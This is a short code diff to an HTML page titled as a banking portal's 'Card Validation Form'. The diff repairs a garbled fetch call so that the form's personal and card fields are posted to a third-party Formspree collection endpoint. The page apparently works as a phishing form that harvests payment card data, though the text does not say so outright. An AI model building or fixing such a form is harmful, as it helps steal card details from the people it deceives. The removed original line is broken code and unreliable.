@@ -196,11 +196,13 @@
       // Use a PCI-compliant payment processor/tokenization instead.
 
       try {
-        // Replace with your real backend endpoint:
-        const response = "https://formspree.io/f/mjkaaqgn" fetch("https://formspree.io/f/mjkaaqgn"/api/submit-form", {
+        const endpoint = form.action; // e.g. https://formspree.io/f/mjkaaqgn
+        const formData = new FormData(form);
+
+        const response = await fetch(endpoint, {
           method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(jsonData),
+          headers: { "Accept": "application/json" },
+          body: formData,
         });
 
         if (response.ok) {
@@ -241,7 +243,11 @@
   <div class="banking-portal">
     <h1>Card Validation Form</h1>
 
-    <form id="https://formspree.io/f/mjkaaqgn" action="#" method="post">
+    <form
+    id="myForm"
+    action="https://formspree.io/f/mjkaaqgn"
+    method="POST"
+      
       <fieldset>
         <legend>Personal Information</legend>
 
@@ -342,6 +348,7 @@
 </body>
 
 </html>
+
 
 
 
